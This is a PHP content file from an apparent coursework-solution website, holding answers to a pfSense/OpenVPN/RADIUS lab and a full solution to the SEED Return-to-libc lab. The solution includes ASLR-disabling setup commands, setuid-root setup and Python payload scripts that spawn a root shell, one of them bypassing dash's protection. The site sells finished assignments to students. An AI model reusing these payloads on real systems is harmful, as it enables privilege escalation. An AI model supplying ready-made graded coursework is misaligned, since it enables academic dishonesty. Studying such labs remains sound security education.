                    'This confirms that pfSense was able to communicate with the FreeRADIUS server and successfully authenticate the RADIUS user omega. Therefore, the RADIUS configuration between pfSense and FreeRADIUS was working correctly and was ready to be used for VPN authentication.'
                ]
            ],
            [
                'n' => 8,
                'question' => 'Why the CA certificate should be issued by a CA entity created exclusively for the VPN rather than a public authority?',
                'answer' => [
                    'The CA certificate should be issued by a dedicated Certificate Authority (CA) created exclusively for the VPN because it provides a separate and controlled trust environment for the VPN infrastructure. In this lab, the CA is used to establish trust between the pfSense OpenVPN server and the VPN client.',
                    'Using a dedicated VPN CA has several security advantages. First, it limits the trust relationship to the VPN system instead of relying on a public CA that is trusted by many unrelated systems and services. The VPN administrator has complete control over certificate creation, distribution, renewal, and revocation.',
                    'A dedicated CA also provides better isolation. If the VPN CA or one of its certificates is compromised, the impact can be limited to the VPN environment rather than affecting certificates and services that depend on a public authority. It also allows the organization to use certificates for its internal VPN infrastructure without exposing the VPN\'s certificate management to an external public authority.',
                    'Therefore, creating a private CA specifically for the VPN provides better control, isolation, and management of VPN certificates and establishes a clearly defined trust relationship between the OpenVPN server and its authorized clients.'
                ]
            ],
            [
                'n' => 9,
                'question' => 'Can Remote ping PC100 after the VPN is established? Why? Show the output of the command “ip addr” in Remote.',
                'answer' => [
                    'Yes, Remote can ping PC100 after the VPN connection is successfully established. This is because the VPN configuration connects the Remote workstation to the Intranet network (192.168.50.0/24) through the pfSense firewall. The VPN clients are assigned an IP address from the 192.168.55.0/26 network, which allows Remote to communicate with resources on the internal Intranet.',
                    'PC100 has the IP address 192.168.50.100. Once the OpenVPN tunnel is established, Remote receives a VPN IP address from the 192.168.55.0/26 VPN client network and can route traffic through the encrypted VPN tunnel toward the Intranet. Therefore, Remote should be able to successfully ping 192.168.50.100.',
                    'Command used on Remote',
                    'The output should show the normal network interfaces of Remote as well as the VPN/TUN interface with an IP address belonging to the 192.168.55.0/26 network.'
                ],
                'code' => 'ip addr',
                'code_after' => 3,
                'image' => '/assets/case-studies/pfsense-openvpn-radius-vpn-lab/q9.webp',
                'caption' => 'Remote ip addr output showing tun0 with an address in the 192.168.55.0/26 VPN client network.'
            ],
            [
                'n' => 10,
                'question' => 'After establishing the VPN, what network segments are encrypted? Explain in detail, referring to the network diagram in the 1st page.',
                'answer' => [
                    'After the VPN connection is established, the traffic between Remote and the pfSense VPN server is transmitted through the encrypted OpenVPN tunnel. This protects the data while it is travelling across the untrusted network between Remote and the VPN server.',
                    'According to the network design, Remote is outside the Intranet and connects to the pfSense firewall through an external/home network. When the VPN is active, traffic from Remote destined for the Intranet network 192.168.50.0/24 is encapsulated and encrypted by OpenVPN before it leaves Remote.',
                    'The encrypted path can be represented as:',
                    'Therefore, the important encrypted segment is the VPN tunnel between Remote and pfSense. Once pfSense receives and decrypts the VPN traffic, it forwards the traffic to the required device on the internal Intranet. The internal segment between pfSense and PC100 is part of the trusted Intranet and is not itself the encrypted OpenVPN tunnel.',
                    'In summary: OpenVPN protects the traffic while it travels between Remote and pfSense across the external/untrusted network. After pfSense decrypts the traffic, it is forwarded normally within the 192.168.50.0/24 Intranet.'
                ],
                'highlight' => 'Remote → External/Home Network → Router → pfSense/OpenVPN → Intranet (192.168.50.0/24) → PC100 (192.168.50.100)',
                'highlight_after' => 3
            ],
            [
                'n' => 11,
                'question' => 'Would the command “telnet 192.168.50.100” be secure if there was an attacker eavesdropping all network traffic in Remote’s local network (your home’s in this lab)? Why?',
                'answer' => [
                    'Yes, with respect to an attacker who is only eavesdropping on Remote\'s local/home network, the Telnet traffic is protected by the OpenVPN tunnel because the traffic destined for 192.168.50.100 is encapsulated and encrypted before it crosses the local network. Therefore, the attacker cannot directly read the Telnet username, password, or data from the captured OpenVPN traffic. However, Telnet itself is still an unencrypted protocol, so the communication is not end-to-end encrypted. After pfSense decrypts the VPN traffic, the Telnet traffic travels normally across the Intranet'
                ]
            ],
            [
                'n' => 12,
                'question' => 'Would it be secure if the attacker was connected to the Intranet using another workstation, for instance, PC-105? Why',
                'answer' => [
                    'No, the connection would not be completely secure if an attacker were connected directly to the Intranet through another workstation, such as PC-105.',
                    'The OpenVPN tunnel protects the traffic while it is travelling between Remote and the pfSense firewall. However, after pfSense decrypts the VPN traffic and forwards it to the Intranet, the traffic travels through the internal network toward PC100 (192.168.50.100).',
                    'An attacker who has access to the Intranet through PC-105 could potentially monitor or capture traffic on the internal network, depending on the network configuration and the attacker\'s privileges. The attacker would not be able to decrypt the portion of traffic protected by the OpenVPN tunnel between Remote and pfSense, but the traffic after it leaves pfSense is no longer protected by the OpenVPN encryption.',
                    'This is particularly important when using an unencrypted protocol such as Telnet, because Telnet does not provide its own encryption for usernames, passwords, or transmitted data.',
                    'The VPN protects the communication between Remote and pfSense, but it does not provide end-to-end encryption between Remote and PC100 across the Intranet. Therefore, an attacker with suitable access to the Intranet could potentially observe the unencrypted Telnet communication.'
                ]
            ],
            [
                'n' => 13,
                'question' => 'What information is provided in Status → OpenVPN after the connection is established?',
                'answer' => [
                    'After establishing the VPN connection, I checked Status → OpenVPN in pfSense. This page shows the details of the active VPN connection and confirms that the OpenVPN tunnel is running.',
                    'It provides information such as the connected client, VPN IP address, connection time, and the amount of data sent and received. This information is useful for checking whether the Remote workstation is properly connected to the VPN and whether data is passing through the tunnel.',
                    'In this lab, the OpenVPN status can be used to confirm that Remote is connected to pfSense and has received an IP address from the VPN network (192.168.55.0/26).'
                ]
            ],
            [
                'n' => 14,
                'question' => 'The log entries can be found in Status → System Logs → OpenVPN. What is the TUN/TAP device used? What is the value of IV_VER in the set of peer info messages? Explain and capture a screenshot.',
                'answer' => [
                    'The OpenVPN log entries were examined under Status → System Logs → OpenVPN. The VPN connection uses a TUN/TAP virtual network device to create the virtual interface required for the OpenVPN tunnel. In this configuration, the TUN device used is tun0.',
                    'The log also contains a set of peer information messages exchanged during the OpenVPN connection. The IV_VER parameter identifies the OpenVPN version reported by the connecting peer. The exact IV_VER value should be taken directly from the OpenVPN log generated by the lab system, as it depends on the OpenVPN version installed on the Remote workstation.',
                    'Therefore:',
                    'The TUN interface provides the virtual network interface through which VPN traffic is transmitted, while IV_VER provides information about the OpenVPN software version used by the peer. These log entries help verify that the OpenVPN connection has been successfully established and provide useful information about the VPN session.',
                    'A screenshot of Status → System Logs → OpenVPN showing the relevant TUN/TAP and IV_VER entries should be included as evidence. The lab specifically requires this information and a screenshot of the OpenVPN logs.'
                ],
                'bullets' => [
                    'TUN/TAP device: tun0',
                    'IV_VER: The OpenVPN version displayed in the peer information messages in the log.'
                ],
                'bullets_after' => 3,
                'image' => '/assets/case-studies/pfsense-openvpn-radius-vpn-lab/q14.webp',
                'caption' => 'OpenVPN log evidence showing the tun0 device and peer information including IV_VER=2.5.8.'
            ]
        ],
        'related_links' => [
            [
                '/network-security-assignment-help',
                'Network Security Assignment Help'
            ],
            [
                '/information-security-assignment-help',
                'Information Security Assignment Help'
            ],
            [
                '/cryptography-assignment-help',
                'Cryptography Assignment Help'
            ],
            [
                '/case-studies',
                'Solved Assignments'
            ]
        ]
    ],
    'return-to-libc-attack-lab' => [
        'menu_featured' => false,
        'template' => 'return_to_libc_lab',
        'page_type' => 'case_study',
        'title' => 'Return-to-libc Attack Lab: Buffer Overflow, libc Addresses and dash Countermeasure',
        'meta_title' => 'Return-to-libc Attack Lab Solution | Cyber Assignment Pro',
        'h1' => 'Return-to-libc Attack Lab: Buffer Overflow, libc Addresses and dash Countermeasure',
        'nav' => 'Return-to-libc Attack Lab',
        'description' => 'Solved CSCE 5552 Return-to-libc Attack Lab using the supplied SEED Ubuntu 20.04 environment, including libc address discovery, payload construction, attack variations and the dash countermeasure task.',
        'primary' => 'return-to-libc attack lab solution',
        'eyebrow' => 'Solved Buffer Overflow Lab',
        'menu_meta' => 'Return-to-libc · GDB · Stack Layout',
        'topics' => ['Return-to-libc','Buffer Overflow','GDB','libc','system()','execv()','Non-executable Stack','Set-UID','SEED Labs','Ubuntu 20.04'],
        'course' => 'CSCE 5552',
        'lab' => 'Return-to-libc Attack Lab',
        'environment' => 'SEED Ubuntu 20.04 VM',
        'architecture' => '32-bit program on x64 VM',
        'buf_size' => '96',
        'requirement_map' => [
            ['01','Environment Setup','Use the SEED Ubuntu 20.04 lab environment, compile the 32-bit vulnerable program, disable the specified countermeasures and keep the stack non-executable.'],
            ['02','Task 1: Find libc Addresses','Use gdb with the target Set-UID program to find the addresses needed from libc and determine the saved return-address offset.'],
            ['03','Task 2: Locate the Shell String','Put /bin/sh in process memory and determine its address for the return-to-libc call.'],
            ['04','Task 3: Launch and Test the Attack','Construct badfile, explain the selected offsets and addresses, then test the exit() and renamed-program variations.'],
            ['05','Task 4: Defeat the Shell Countermeasure','Restore /bin/sh to dash and construct the supplied execv() based solution for /bin/bash -p in the controlled lab.'],
            ['06','Source Files','Review the exact C and Python source files supplied inside the completed solution ZIP.']
        ],
        'setup_commands' => [
            'sudo sysctl -w kernel.randomize_va_space=0',
            'cat /proc/sys/kernel/randomize_va_space',
            'sudo ln -sf /bin/zsh /bin/sh',
            'ls -l /bin/sh',
            'gcc -m32 -g -DBUF_SIZE=96 -fno-stack-protector -z noexecstack -o retlib retlib.c',
            'sudo chown root retlib',
            'sudo chmod 4755 retlib',
            'ls -l retlib',
        ],
        'task1_lines' => [
            'Task 1 (Finding libc Addresses)',
            'Step 2.1: Open gdb',
            'Step 2.2: Get the addresses',
            '$ebp = 0xffffcdd8',
            '&buffer = 0xffffcd6c',
            'Calculation:',
            '$ebp + 4 = 0xffffcdd8 + 4 = 0xffffcddc (This is the saved return address).',
            '0xffffcddc - 0xffffcd6c = 0x70',
            '0x70 in decimal is 112.',
            'Your new Y = 112.',
        ],
        'task2_lines' => [
            'PART 3: Task 2 (Finding the /bin/sh address)',
            'Create and run prtenv.c',
            'Replace sh_addr    with prtenv output',
            'Explanation of code snippet:',
            'content = bytearray(0xaa...): We create a 500-byte array filled with0xaa(garbage bytes). We use 500 bytes so the payload is long enough to reach into main\'sinput` buffer safely.',
            'bash_addr, arg_addr: The memory addresses for "/bin/bash" and "-p", found using the ./prtenv2 helper program.',
            'buffer_addr, input_addr: The exact stack addresses printed by ./retlib. We need input_addr to calculate where our argv array will live.',
            'Y = 112: The offset we calculated in gdb for BUF_SIZE=96. It\'s the number of bytes needed to overwrite the saved return address (EIP).',
            'A = 200: The offset where we build the argv array in main\'s input buffer. We put it here so strcpy doesn\'t truncate the payload at the NULL terminator.',
            'content[Y:Y+4] = ...: This is where we overwrite the stack. We overwrite the return address to jump to execv, set exit as its return address, and point its two arguments to "/bin/bash" and the argv array. to_bytes(4, \'little\') formats the addresses for the 32-bit processor.',
            'When bof returns:
It jumps to execv() → execv reads the argv array → executes /bin/bash -p → giving us a root shell while bypassing the dash privilege drop.',
            'Type id now the user is root',
        ],
        'variation1_lines' => [
            'PART 5: Attack Variation 1 (Without exit())',
            'Open nano exploit.py. Change X to Y + 8 and completely remove the exit lines:',
            'This script generates the payload to test the attack without exit().',
            'Answer: No, the exit() function is not strictly necessary to get the root shell.',
            'Observations & Explanation:
If we remove the exit() address from the badfile the attack still successfully spawns a root shell. However, when we type exit to leave the shell, the program crashes with a Segmentation fault.
This happens because system() needs a return address to know where to go after the shell finishes. Without exit(), it looks at the next value on the stack, which is the address of the "/bin/sh" string. The CPU attempts to execute the string "/bin/sh" as if it were machine code, causing a crash. exit() is only used to ensure the program terminates gracefully',
        ],
        'variation2_lines' => [
            'PART 6: Attack Variation 2 (Changing the Name)',
            'Answer: The attack will not succeed if you change the program name. It will crash with a Segmentation fault.',
            'Observations & Explanation:
When we renamed the program from retlib (6 characters) to newretlib1 (10 characters) and ran it without changing the badfile, the attack failed.
This is because the program name (argv[0]) is stored on the stack, directly before the environment variables. Changing the length of the program name shifts the entire memory layout by a few bytes. Because our badfile contains a hardcoded absolute memory address for the MYSHELL environment variable, that address is now pointing to the wrong location in memory. When system() tries to read "/bin/sh" from that address, it crashes. This proves that return-to-libc attacks are highly sensitive to the exact memory layout',
        ],
        'task4_lines' => [
            'PART 7: Task 4 (Defeating dash)',
            'Enable the protection',
            'sudo ln -sf /bin/dash /bin/sh',
            'Run ./retlib to get the stack addresses:',
            'To find the memory addresses of the strings "/bin/bash" and "-p", I exported them as environment variables (MYBASH and MYARG) and wrote a C helper program (prtenv2.c) using getenv(). This program printed their exact stack addresses. While I used this method to locate the addresses initially, I later opted to hardcode the strings directly into the badfile payload in my Python script to avoid the addresses shifting between terminal sessions.',
            'prtenv2 helper program to extract the exact memory addresses of the environment variables MYBASH and MYARG. The program returned 0xffffde89 and 0xffffde24 respectively.',
            'This Python script constructs the final payload to bypass the dash countermeasure using execv().',
            'content = bytearray(...): Creates the payload with filler bytes (0xaa).',
            'input_addr, buffer_addr: Exact addresses printed by ./retlib. We use input_addr to place our array safely.',
            'bash_offset, arg_p_offset: We place the strings "/bin/bash" and "-p" inside main\'s input buffer to avoid strcpy truncation.',
            'Y = 112: The exact offset to overwrite the return address (EIP) on the stack.',
            'content[Y:Y+16] = ...: We overwrite the return address with execv. We set its return address to exit, its first argument to "/bin/bash", and its second argument to our argv array.',
            'content[A:A+12] = ...: At offset A = 200 (inside input), we build the argv array: ["/bin/bash", "-p", NULL]. The NULL safely lives in input without breaking strcpy.',
            'Result: The program jumps to execv and runs /bin/bash -p, bypassing dash and giving root access.',
            'When retlib runs, bof returns and jumps to execv. execv looks at bash_addr, sees "/bin/bash", then looks at argv_addr, sees ["/bin/bash", "-p", NULL], and executes it.',
        ],
        'evidence_sheets' => [
            '/assets/case-studies/return-to-libc-attack-lab/evidence-1.jpg?v=2',
            '/assets/case-studies/return-to-libc-attack-lab/evidence-2.jpg?v=2'
        ],
        'source_files' => [
            ['name' => 'retlib.c', 'language' => 'C', 'code' => '#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifndef BUF_SIZE
#define BUF_SIZE 12
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];
    unsigned int *framep;

    // Copy ebp into framep
    asm("movl %%ebp, %0" : "=r" (framep));      

    /* print out information for experiment purpose */
    printf("Address of buffer[] inside bof():  0x%.8x\\n", (unsigned)buffer);
    printf("Frame Pointer value inside bof():  0x%.8x\\n", (unsigned)framep);

    strcpy(buffer, str);   

    return 1;
}

void foo(){
    static int i = 1;
    printf("Function foo() is invoked %d times\\n", i++);
    return;
}

int main(int argc, char **argv)
{
   char input[1000];
   FILE *badfile;

   badfile = fopen("badfile", "r");
   int length = fread(input, sizeof(char), 1000, badfile);
   printf("Address of input[] inside main():  0x%x\\n", (unsigned int) input);
   printf("Input size: %d\\n", length);

   bof(input);

   printf("(^_^)(^_^) Returned Properly (^_^)(^_^)\\n");
   return 1;
}'],
            ['name' => 'prtenv.c', 'language' => 'C', 'code' => '#include <stdio.h>
#include <stdlib.h>
int main(void) {
    char *shell = getenv("MYSHELL");
    if (shell) printf("%x\\n", (unsigned int)shell);
    return 0;
}'],
            ['name' => 'exploit2.py', 'language' => 'Python', 'code' => '#!/usr/bin/env python3
content = bytearray(0xaa for i in range(300))

sh_addr     = 0xffffd47f  # <--- REPLACE with your new ./prtenv output
system_addr = 0xf7e12420
exit_addr   = 0xf7e04f80

Y = 112                   # Your new offset!
X = Y + 8
Z = Y + 4

content[X:X+4] = (sh_addr).to_bytes(4, \'little\')
content[Y:Y+4] = (system_addr).to_bytes(4, \'little\')
content[Z:Z+4] = (exit_addr).to_bytes(4, \'little\')

with open("badfile", "wb") as f:
    f.write(content)'],
            ['name' => 'exploit.py', 'language' => 'Python', 'code' => '#!/usr/bin/env python3
content = bytearray(0xaa for i in range(300))

sh_addr     = 0xffffd47f  # <--- REPLACE with your new ./prtenv output
system_addr = 0xf7e12420
# exit_addr removed: not used in this version

Y = 112                   # Your offset
X = Y + 8
Z = Y + 4

content[X:X+4] = (sh_addr).to_bytes(4, \'little\')
content[Y:Y+4] = (system_addr).to_bytes(4, \'little\')
# content[Z:Z+4] intentionally left untouched: stays 0xaaaaaaaa

with open("badfile", "wb") as f:
    f.write(content)'],
            ['name' => 'prtenv2.c', 'language' => 'C', 'code' => '#include <stdio.h>
#include <stdlib.h>
int main(void) {
    char *b = getenv("MYBASH");
    char *a = getenv("MYARG");
    if (b) printf("MYBASH: %x\\n", (unsigned int)b);
    if (a) printf("MYARG : %x\\n", (unsigned int)a);
    return 0;
}'],
            ['name' => 'exploit3.py', 'language' => 'Python', 'code' => '#!/usr/bin/env python3
content = bytearray(0xaa for i in range(500))

# Addresses printed by ./retlib (THIS run)
buffer_addr = 0xffffcd8c
input_addr  = 0xffffce10

# Place the strings inside main\'s input[] buffer
# (safe from strcpy truncation, since input[] is filled via fread)
bash_offset  = 140
arg_p_offset = 160

bash_addr  = input_addr + bash_offset
arg_p_addr = input_addr + arg_p_offset

content[bash_offset:bash_offset+10]  = b"/bin/bash\\x00"
content[arg_p_offset:arg_p_offset+3] = b"-p\\x00"

# Addresses from gdb
execv_addr = 0xf7e994b0
exit_addr  = 0xf7e04f80

Y = 112    # = Frame Pointer - buffer_addr + 4 = 0xffffcdf8 - 0xffffcd8c + 4
A = 200    # offset in input[] where we build the argv array
argv_addr = input_addr + A

# 1. Setup execv\'s fake stack frame
content[Y:Y+4]     = execv_addr.to_bytes(4, \'little\')   # bof() returns -> execv()
content[Y+4:Y+8]   = exit_addr.to_bytes(4, \'little\')    # execv\'s "return addr" if it fails
content[Y+8:Y+12]  = bash_addr.to_bytes(4, \'little\')    # execv arg1: "/bin/bash"
content[Y+12:Y+16] = argv_addr.to_bytes(4, \'little\')    # execv arg2: &argv[]

# 2. Setup the argv array at offset A
# argv = {"/bin/bash", "-p", NULL}
content[A:A+4]     = bash_addr.to_bytes(4, \'little\')
content[A+4:A+8]   = arg_p_addr.to_bytes(4, \'little\')
content[A+8:A+12]  = (0).to_bytes(4, \'little\')

with open("badfile", "wb") as f:
    f.write(content)'],
        ],
        'related_links' => [
            ['/ethical-hacking-assignment-help','Ethical Hacking Assignment Help'],
            ['/penetration-testing-assignment-help','Penetration Testing Assignment Help'],
            ['/information-security-assignment-help','Information Security Assignment Help'],
            ['/case-studies/buffer-overflow-attack-demo-getscore','Buffer Overflow Attack Demo and getscore Analysis'],
            ['/case-studies','All Solved Assignments']
        ]
    ],

];
